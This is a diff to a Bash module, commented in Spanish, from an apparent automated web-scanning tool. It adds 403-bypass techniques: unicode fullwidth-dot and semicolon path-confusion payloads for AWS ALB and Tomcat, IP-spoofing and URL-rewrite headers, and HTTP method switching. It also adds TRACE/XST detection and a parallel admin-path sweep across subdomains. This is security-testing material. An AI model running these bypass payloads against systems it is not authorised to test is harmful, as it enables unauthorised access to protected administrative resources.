@@ -10,6 +10,9 @@
 #    - Case manipulation (/Admin, /ADMIN)
 #    - IP spoofing headers (X-Forwarded-For: 127.0.0.1)
 #    - Protocol downgrade (https→http)
+#    - ALB unicode bypass: fullwidth dots %ef%bc%8e%ef%bc%8e
+#      (AWS ALB no normaliza unicode; Tomcat/Spring sí — bypassa WAF)
+#    - ALB + Tomcat chain: unicode dots + semicolon path confusion
 #
 #  Referencias:
 #    - HackTricks 403 bypass
@@ -44,11 +47,17 @@ $(echo "$PATH_" | sed 's/\//\/%2f/')
 $(echo "$PATH_" | sed 's/\//\/.\//g')
 $(echo "$PATH_" | tr '[:lower:]' '[:upper:]')
 $(echo "$PATH_" | sed 's/a/A/1')
+/%ef%bc%8e%ef%bc%8e${PATH_}
+/%ef%bc%8e%ef%bc%8e/..${PATH_}
+/%ef%bc%8e%ef%bc%8e/..;${PATH_}
+/..;/%ef%bc%8e%ef%bc%8e${PATH_}
 VARIATIONS
 }
 
 # ── Headers de bypass ─────────────────────────────────────────
-declare -A BYPASS_HEADERS=(
+# declare -gA so it's visible from _test_403_bypass (a global function)
+# when this module is sourced inside _run_module()
+declare -gA BYPASS_HEADERS=(
   ["X-Original-URL"]="PATH"
   ["X-Rewrite-URL"]="PATH"
   ["X-Custom-IP-Authorization"]="127.0.0.1"
@@ -81,7 +90,7 @@ _test_403_bypass() {
 
   # Obtener status original
   local ORIG_STATUS
-  ORIG_STATUS=$(curl -sL --max-time 8 \
+  ORIG_STATUS=$(curl -sL -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
     -o /dev/null -w "%{http_code}" \
     ${PROXY_FLAG} "$URL" 2>/dev/null)
 
@@ -96,7 +105,7 @@ _test_403_bypass() {
     [[ -z "$VAR_PATH" || "$VAR_PATH" == "$PATH_" ]] && continue
     local VAR_URL="${BASE_HOST}${VAR_PATH}"
     local STATUS
-    STATUS=$(curl -sL --max-time 8 \
+    STATUS=$(curl -sL -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
       -o /dev/null -w "%{http_code}" \
       ${PROXY_FLAG} "$VAR_URL" 2>/dev/null)
 
@@ -117,7 +126,7 @@ _test_403_bypass() {
     [[ "$VALUE" == "PATH" ]] && VALUE="$PATH_"
 
     local STATUS
-    STATUS=$(curl -sL --max-time 8 \
+    STATUS=$(curl -sL -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
       -o /dev/null -w "%{http_code}" \
       -H "${HEADER}: ${VALUE}" \
       ${PROXY_FLAG} "$URL" 2>/dev/null)
@@ -134,9 +143,11 @@ _test_403_bypass() {
   $BYPASSED && return 0
 
   # ── Técnica 3: HTTP method switching ────────────────────────
-  for METHOD in POST PUT PATCH HEAD DELETE OPTIONS TRACE; do
+  # TRACE excluido: devuelve 200 en cualquier path cuando está habilitado
+  # (no es un bypass real — se detecta como XST en módulo 25/nuclei)
+  for METHOD in POST PUT PATCH HEAD DELETE OPTIONS; do
     local STATUS BODY_LEN
-    STATUS=$(curl -sL --max-time 8 \
+    STATUS=$(curl -sL -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
       -o /dev/null -w "%{http_code}" \
       -X "$METHOD" \
       ${PROXY_FLAG} "$URL" 2>/dev/null)
@@ -190,6 +201,44 @@ module_run() {
   local CURL_PROXY=""
   $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"
 
+  # Detect Cloudflare Bot Management: if root returns "Just a moment..." body,
+  # all 403s will be CF challenges — bypass attempts are pointless.
+  # Check two random paths; if both return same non-zero size, it's a uniform WAF.
+  local ALIVE_FILE="$OUT_DIR/subs_alive.txt"
+  local CF_BOT_PROTECTION=false
+  if [[ -s "$ALIVE_FILE" ]]; then
+    local _FIRST_SUB
+    _FIRST_SUB=$(head -1 "$ALIVE_FILE" | tr -d '[:space:]')
+    local _CF_BODY
+    _CF_BODY=$(curl -s -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
+      "https://${_FIRST_SUB}/" 2>/dev/null | head -c 1000)
+    if echo "$_CF_BODY" | grep -qi "Just a moment\|cf-browser-verification\|cf_chl\|Checking your browser"; then
+      log_info "Cloudflare Bot Management detectado — limitando bypass a técnicas anti-CF"
+      CF_BOT_PROTECTION=true
+    fi
+  fi
+
+  # ── Detección de TRACE habilitado (XST) ─────────────────────
+  if [[ -s "$ALIVE_FILE" ]]; then
+    local _TRACE_SUB
+    _TRACE_SUB=$(head -1 "$ALIVE_FILE" | tr -d '[:space:]')
+    local _TRACE_STATUS
+    _TRACE_STATUS=$(curl -s -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
+      -o /dev/null -w "%{http_code}" -X TRACE \
+      ${CURL_PROXY} "https://${_TRACE_SUB}/" 2>/dev/null)
+    if [[ "$_TRACE_STATUS" == "200" ]]; then
+      log_warn "  ⚡ TRACE habilitado (XST): https://${_TRACE_SUB}/ → HTTP 200 — Cross-Site Tracing permite robo de headers HTTP-only"
+      db_add_finding "$DOMAIN_ID" "xst" "medium" \
+        "https://${_TRACE_SUB}/" "trace_enabled" \
+        "TRACE method habilitado — Cross-Site Tracing (XST): un atacante puede leer headers HTTP (incluyendo cookies) via JS cross-origin"
+      _telegram_send "🔍 *TRACE habilitado (XST)*
+🌐 \`${DOMAIN}\`
+🔗 \`https://${_TRACE_SUB}/\`
+⚠️ HTTP TRACE activo — Cross-Site Tracing permite robo de headers/cookies
+📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
+    fi
+  fi
+
   # Primero hacer un sweep rápido para encontrar 403s
   local TARGETS_403="$OUT_DIR/.targets_403.txt"
   > "$TARGETS_403"
@@ -205,27 +254,53 @@ module_run() {
     "/server-status" "/nginx_status" "/phpinfo.php"
   )
 
-  # Testear paths admin en cada subdominio alive
-  if [[ -s "$OUT_DIR/subs_alive.txt" ]]; then
-    while IFS= read -r SUB; do
-      [[ -z "$SUB" ]] && continue
-      for APATH in "${ADMIN_PATHS[@]}"; do
-        local TEST_URL="https://${SUB}${APATH}"
-        local STATUS
-        STATUS=$(curl -sL --max-time 6 \
-          -o /dev/null -w "%{http_code}" \
-          ${CURL_PROXY} "$TEST_URL" 2>/dev/null)
-        if [[ "$STATUS" == "403" || "$STATUS" == "401" ]]; then
-          echo "$TEST_URL" >> "$TARGETS_403"
-        fi
-      done
-    done < "$OUT_DIR/subs_alive.txt"
+  # Skip admin path sweep when Cloudflare Bot Management is active:
+  # CF returns 403 for ALL paths uniformly, so the sweep adds noise without value.
+  # Only proceed with paths actually discovered by the crawler (DB-sourced below).
+  if $CF_BOT_PROTECTION; then
+    log_info "Saltando sweep de paths admin (CF Bot Protection activo — todos devuelven 403)"
   fi
 
-  # También URLs de la DB que ya dieron 403
+  # Testear paths admin en cada subdominio alive
+  # Sin -L: capturar el status real (no el de destino del redirect)
+  # 429 también interesante: rate limiting en ruta protegida
+  if [[ ! "$CF_BOT_PROTECTION" == "true" && -s "$OUT_DIR/subs_alive.txt" ]]; then
+    local SWEEP_PIDS=() SWEEP_TMP="$OUT_DIR/.sweep_tmp"
+    mkdir -p "$SWEEP_TMP"
+    while IFS= read -r SUB; do
+      [[ -z "$SUB" ]] && continue
+      (
+        for APATH in "${ADMIN_PATHS[@]}"; do
+          local TEST_URL="https://${SUB}${APATH}"
+          local STATUS
+          STATUS=$(curl -s -A "${SCAN_UA:-Mozilla/5.0}" --max-time 6 \
+            -o /dev/null -w "%{http_code}" \
+            ${CURL_PROXY} "$TEST_URL" 2>/dev/null)
+          if [[ "$STATUS" == "403" || "$STATUS" == "401" || "$STATUS" == "429" ]]; then
+            echo "$TEST_URL|$STATUS" >> "$SWEEP_TMP/${SUB//\//_}.txt"
+          fi
+        done
+      ) &
+      SWEEP_PIDS+=($!)
+      if [[ ${#SWEEP_PIDS[@]} -ge 10 ]]; then
+        wait "${SWEEP_PIDS[0]}" 2>/dev/null || true
+        SWEEP_PIDS=("${SWEEP_PIDS[@]:1}")
+      fi
+    done < "$OUT_DIR/subs_alive.txt"
+    wait "${SWEEP_PIDS[@]}" 2>/dev/null || true
+
+    while IFS='|' read -r TURL TSTATUS; do
+      [[ -z "$TURL" ]] && continue
+      echo "$TURL" >> "$TARGETS_403"
+      [[ "$TSTATUS" == "429" ]] && log_info "  🔒 Rate limited (429) en: $TURL"
+    done < <(cat "$SWEEP_TMP"/*.txt 2>/dev/null)
+    rm -rf "$SWEEP_TMP"
+  fi
+
+  # También URLs de la DB que ya dieron 403/401/429
   sqlite3 "$DB_PATH" \
     "SELECT url FROM urls
-     WHERE domain_id=${DOMAIN_ID} AND status_code IN (403,401)
+     WHERE domain_id=${DOMAIN_ID} AND status_code IN (403,401,429)
      LIMIT 50;" 2>/dev/null >> "$TARGETS_403"
 
   sort -u "$TARGETS_403" -o "$TARGETS_403"
